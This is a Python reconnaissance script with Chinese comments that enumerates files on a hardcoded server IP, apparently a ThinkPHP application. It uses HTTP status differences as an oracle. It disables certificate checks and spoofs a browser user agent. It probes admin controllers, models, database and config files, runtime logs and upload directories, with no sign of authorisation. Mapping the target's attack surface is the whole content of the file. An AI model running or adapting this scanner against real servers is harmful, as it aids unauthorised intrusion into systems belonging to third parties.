#!/usr/bin/env python3
"""tp_file_enum.py - 通过PHP错误回显枚举目标服务器文件(只读探测)
原理: 存在的.php -> 200 + "Class not found"(框架未加载); 不存在的 -> 404 nginx
"""
import urllib.request, ssl, sys, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
BASE = "https://139.196.199.221"

def exists(path):
    url = BASE + path
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=6, context=ctx)
        return r.status == 200
    except urllib.error.HTTPError as e:
        return False
    except Exception:
        return False

def enum(dir_path, names):
    """枚举dir_path下的文件, 返回存在的"""
    hits = []
    for n in names:
        p = dir_path + n
        if exists(p):
            hits.append(n)
            print("  FOUND: %s" % p, flush=True)
    return hits

# 控制器目录枚举
print("=== admin/controller ===", flush=True)
enum("/application/admin/controller/", ["Login.php","Index.php","User.php","Upload.php","File.php",
    "News.php","Article.php","Config.php","Setting.php","System.php","Admin.php","Member.php",
    "Order.php","Product.php","Goods.php","Category.php","Type.php","Brand.php","Comment.php",
    "Message.php","Feedback.php","Link.php","Ad.php","Banner.php","Slide.php","Api.php",
    "Common.php","Base.php","Public.php","Auth.php","Ajax.php","Data.php","Database.php",
    "Export.php","Import.php","Cache.php","Clear.php","Log.php","Error.php","IndexController.php",
    "Money.php","Finance.php","Report.php","Stat.php","Push.php","Sms.php","Send.php",
    "Vcode.php","Verify.php","Captcha.php","Loginlog.php","Operlog.php","Photo.php","Img.php",
    "Picture.php","Image.php","Album.php","Down.php","Download.php","Soft.php","Tool.php"])

# common/controller
print("=== common/controller ===", flush=True)
enum("/application/common/controller/", ["AdminBase.php","Base.php","Common.php","ApiBase.php",
    "HomeBase.php","Public.php","Upload.php","Tool.php"])

# 模型目录
print("=== admin/model ===", flush=True)
enum("/application/admin/model/", ["User.php","Admin.php","Member.php","Config.php","News.php",
    "Article.php","Order.php","Product.php","Upload.php","Log.php","Message.php"])

# 其他关键
print("=== 其他关键文件 ===", flush=True)
for p in ["/application/database.php","/application/config.php","/application/common.php",
          "/application/route.php","/application/command.php","/application/tags.php",
          "/application/admin/config.php","/application/admin/common.php",
          "/application/extra/","/application/extra/database.php",
          "/extend/","/vendor/","/public/uploads/","/public/upload/","/public/static/",
          "/public/static/js/","/runtime/","/runtime/log/","/runtime/cache/",
          "/application/admin/view/","/application/admin/view/login/","/public/admin/"]:
    if exists(p):
        print("  FOUND: %s" % p, flush=True)

# view模板枚举
print("=== admin/view/login ===", flush=True)
enum("/application/admin/view/login/", ["login.html","index.html","Login.html","Index.html"])
print("=== admin/view/index ===", flush=True)
enum("/application/admin/view/index/", ["index.html","Index.html","main.html","Main.html",
    "welcome.html","Welcome.html","home.html"])
print("=== DONE ===", flush=True)
